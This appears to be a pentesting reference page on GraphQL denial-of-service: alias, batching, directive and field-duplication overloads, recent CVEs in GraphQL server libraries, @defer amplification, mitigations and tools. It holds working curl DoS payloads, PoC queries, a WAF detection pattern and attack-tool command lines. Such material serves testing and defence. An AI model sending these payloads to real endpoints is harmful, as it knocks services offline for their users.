# GraphQL - DoS, Recent Vulnerabilities, and Tools

## DoS in GraphQL

### Alias Overloading

**Alias Overloading** is a GraphQL vulnerability where attackers overload a query with many aliases for the same field, causing the backend resolver to execute that field repeatedly. This can overwhelm server resources, leading to a **Denial of Service (DoS)**. For example, in the query below, the same field (`expensiveField`) is requested 1,000 times using aliases, forcing the backend to compute it 1,000 times, potentially exhausting CPU or memory:

```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "Content-Type: application/json" \
    -d '{"query": "{ alias0:__typename \nalias1:__typename \nalias2:__typename \nalias3:__typename \nalias4:__typename \nalias5:__typename \nalias6:__typename \nalias7:__typename \nalias8:__typename \nalias9:__typename \nalias10:__typename \nalias11:__typename \nalias12:__typename \nalias13:__typename \nalias14:__typename \nalias15:__typename \nalias16:__typename \nalias17:__typename \nalias18:__typename \nalias19:__typename \nalias20:__typename \nalias21:__typename \nalias22:__typename \nalias23:__typename \nalias24:__typename \nalias25:__typename \nalias26:__typename \nalias27:__typename \nalias28:__typename \nalias29:__typename \nalias30:__typename \nalias31:__typename \nalias32:__typename \nalias33:__typename \nalias34:__typename \nalias35:__typename \nalias36:__typename \nalias37:__typename \nalias38:__typename \nalias39:__typename \nalias40:__typename \nalias41:__typename \nalias42:__typename \nalias43:__typename \nalias44:__typename \nalias45:__typename \nalias46:__typename \nalias47:__typename \nalias48:__typename \nalias49:__typename \nalias50:__typename \nalias51:__typename \nalias52:__typename \nalias53:__typename \nalias54:__typename \nalias55:__typename \nalias56:__typename \nalias57:__typename \nalias58:__typename \nalias59:__typename \nalias60:__typename \nalias61:__typename \nalias62:__typename \nalias63:__typename \nalias64:__typename \nalias65:__typename \nalias66:__typename \nalias67:__typename \nalias68:__typename \nalias69:__typename \nalias70:__typename \nalias71:__typename \nalias72:__typename \nalias73:__typename \nalias74:__typename \nalias75:__typename \nalias76:__typename \nalias77:__typename \nalias78:__typename \nalias79:__typename \nalias80:__typename \nalias81:__typename \nalias82:__typename \nalias83:__typename \nalias84:__typename \nalias85:__typename \nalias86:__typename \nalias87:__typename \nalias88:__typename \nalias89:__typename \nalias90:__typename \nalias91:__typename \nalias92:__typename \nalias93:__typename \nalias94:__typename \nalias95:__typename \nalias96:__typename \nalias97:__typename \nalias98:__typename \nalias99:__typename \nalias100:__typename \n }"}' \
    'https://example.com/graphql'
```

To mitigate this, implement alias count limits, query complexity analysis, or rate limiting to prevent resource abuse.

### **Array-based Query Batching**

**Array-based Query Batching** is a vulnerability where a GraphQL API allows batching multiple queries in a single request, enabling an attacker to send a large number of queries simultaneously. This can overwhelm the backend by executing all the batched queries in parallel, consuming excessive resources (CPU, memory, database connections) and potentially leading to a **Denial of Service (DoS)**. If no limit exists on the number of queries in a batch, an attacker can exploit this to degrade service availability.

```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '[{"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}]' \
'https://example.com/graphql'
```

In this example, 10 different queries are batched into one request, forcing the server to execute all of them simultaneously. If exploited with a larger batch size or computationally expensive queries, it can overload the server.

### **Directive Overloading Vulnerability**

**Directive Overloading** occurs when a GraphQL server permits queries with excessive, duplicated directives. This can overwhelm the server’s parser and executor, especially if the server repeatedly processes the same directive logic. Without proper validation or limits, an attacker can exploit this by crafting a query with numerous duplicate directives to trigger high computational or memory usage, leading to **Denial of Service (DoS)**.

```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa }", "operationName": "cop"}' \
'https://example.com/graphql'
```

Note that in the previous example `@aa` is a custom directive that **might not be declared**. A common directive that usually exists is **`@include`**:

```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @include(if: true) @include(if: true) @include(if: true) @include(if: true) @include(if: true) }", "operationName": "cop"}' \
'https://example.com/graphql'
```

You can also send an introspection query to discover all the declared directives:

```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "{ __schema { directives { name locations args { name type { name kind ofType { name } } } } } }"}' \
'https://example.com/graphql'
```

And then **use some of the custom** ones.

### **Field Duplication Vulnerability**

**Field Duplication** is a vulnerability where a GraphQL server permits queries with the same field repeated excessively. This forces the server to resolve the field redundantly for every instance, consuming significant resources (CPU, memory, and database calls). An attacker can craft queries with hundreds or thousands of repeated fields, causing high load and potentially leading to a **Denial of Service (DoS)**.

```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" -H "Content-Type: application/json" \
-d '{"query": "query cop { __typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n} ", "operationName": "cop"}' \
'https://example.com/graphql'
```

## Recent Vulnerabilities (2023-2025)

> The GraphQL ecosystem evolves very quickly; during the last two years several critical issues were disclosed in the most-used server libraries. When you find a GraphQL endpoint it is therefore worth fingerprinting the engine (see **graphw00f**) and checking the running version against the vulnerabilities below.

### CVE-2024-47614 – `async-graphql` directive-overload DoS (Rust)
* Affected: async-graphql < **7.0.10** (Rust)
* Root cause: no limit on **duplicated directives** (e.g. thousands of `@include`) which are expanded into an exponential number of execution nodes.
* Impact: a single HTTP request can exhaust CPU/RAM and crash the service.
* Fix/mitigation: upgrade ≥ 7.0.10 or call `SchemaBuilder.limit_directives()`; alternatively filter requests with a WAF rule such as `"@include.*@include.*@include"`.

```graphql
# PoC – repeat @include X times
query overload {
  __typename @include(if:true) @include(if:true) @include(if:true)
}
```

### CVE-2024-40094 – `graphql-java` ENF depth/complexity bypass
* Affected: graphql-java < 19.11, 20.0-20.8, 21.0-21.4
* Root cause: **ExecutableNormalizedFields** were not considered by `MaxQueryDepth` / `MaxQueryComplexity` instrumentation. Recursive fragments therefore bypassed all limits.
* Impact: unauthenticated DoS against Java stacks that embed graphql-java (Spring Boot, Netflix DGS, Atlassian products…).

```graphql
fragment A on Query { ...B }
fragment B on Query { ...A }
query { ...A }
```

### CVE-2023-23684 – WPGraphQL SSRF to RCE chain
* Affected: WPGraphQL ≤ 1.14.5 (WordPress plugin).
* Root cause: the `createMediaItem` mutation accepted attacker-controlled **`filePath` URLs**, allowing internal network access and file writes.
* Impact: authenticated Editors/Authors could reach metadata endpoints or write PHP files for remote code execution.

---

## Incremental delivery abuse: `@defer` / `@stream`
Since 2023 most major servers (Apollo 4, GraphQL-Java 20+, HotChocolate 13) implemented the **incremental delivery** directives defined by the GraphQL-over-HTTP WG. Every deferred patch is sent as a **separate chunk**, so the total response size becomes *N + 1* (envelope + patches). A query that contains thousands of tiny deferred fields therefore produces a large response while costing the attacker only one request – a classical **amplification DoS** and a way to bypass body-size WAF rules that only inspect the first chunk. WG members themselves flagged the risk. 

Example payload generating 2 000 patches:

```graphql
query abuse {
% for i in range(0,2000):
  f{{i}}: __typename @defer
% endfor
}
```

Mitigation: disable `@defer/@stream` in production or enforce `max_patches`, cumulative `max_bytes` and execution time. Libraries like **graphql-armor** (see below) already enforce sensible defaults.

---

## Defensive middleware (2024+)

| Project | Notes |
|---|---|
| **graphql-armor** | Node/TypeScript validation middleware published by Escape Tech. Implements plug-and-play limits for query depth, alias/field/directive counts, tokens and cost; compatible with Apollo Server, GraphQL Yoga/Envelop, Helix, etc. |

Quick start:

```ts
import { protect } from '@escape.tech/graphql-armor';
import { applyMiddleware } from 'graphql-middleware';

const protectedSchema = applyMiddleware(schema, ...protect());
```

`graphql-armor` will now block overly deep, complex or directive-heavy queries, protecting against the CVEs above.

---

## Tools

### Vulnerability scanners

- [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Test common misconfigurations of graphql endpoints
- [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): GraphQL security auditing script with a focus on performing batch GraphQL queries and mutations.
- [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Fingerprint the graphql being used
- [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Toolkit that can be used to grab schemas and search for sensitive data, test authorization, brute force schemas, and find paths to a given type.
- [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Can be used as standalone or [Burp extension](https://github.com/doyensec/inql).
- [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Can be used as a CLI client also to automate attacks: `python3 graphqlmap.py -u http://example.com/graphql --inject`
- [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Tool that lists the different ways of **reaching a given type in a GraphQL schema**.
- [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): The Successor of Standalone and CLI Modes os InQL
- [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Burp extension or python script for advanced GraphQL testing. The _**Scanner**_ is the core of InQL v5.0, where you can analyze a GraphQL endpoint or a local introspection schema file. It auto-generates all possible queries and mutations, organizing them into a structured view for your analysis. The _**Attacker**_ component lets you run batch GraphQL attacks, which can be useful for circumventing poorly implemented rate limits: `python3 inql.py -t http://example.com/graphql -o output.json`
- [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Try to get the schema even with introspection disabled by using the help of some Graphql databases that will suggest the names of mutations and parameters.

### Scripts to exploit common vulnerabilities

- [https://github.com/reycotallo98/pentestScripts/tree/main/GraphQLDoS](https://github.com/reycotallo98/pentestScripts/tree/main/GraphQLDoS): Collection of scripts for exploiting denial-of-service vulnerabilities in vulnerable graphql environments.

### Clients

- [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI client
- [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI Client

### Automatic Tests

- Video explaining AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## References

- [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
- [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
- [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
- [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
- [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)
- [**https://github.com/advisories/GHSA-5gc2-7c65-8fq8**](https://github.com/advisories/GHSA-5gc2-7c65-8fq8)
- [**https://github.com/escape-tech/graphql-armor**](https://github.com/escape-tech/graphql-armor)
- [**https://blog.doyensec.com/2025/12/02/inql-v610.html**](https://blog.doyensec.com/2025/12/02/inql-v610.html)
- [**https://github.com/nicholasaleks/graphql-threat-matrix**](https://github.com/nicholasaleks/graphql-threat-matrix)
